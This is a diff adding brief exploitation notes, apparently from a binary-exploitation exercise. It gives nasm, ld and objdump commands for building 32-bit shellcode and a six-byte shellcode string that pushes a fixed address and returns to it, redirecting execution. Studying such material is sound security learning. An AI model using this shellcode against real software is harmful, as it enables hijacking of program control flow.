@@ -1,0 +1,9 @@
+Need to create our own shellcode
+
+Compile in 32-bit:
+nasm -f elf32 -o payload.o payload.asm
+ld -s -m elf_i386 -o payload payload.o
+objdump -M intel -d payload > payload.dump
+
+Custom shellcode:
+\x68\xfb\x89\x04\x08\xc3
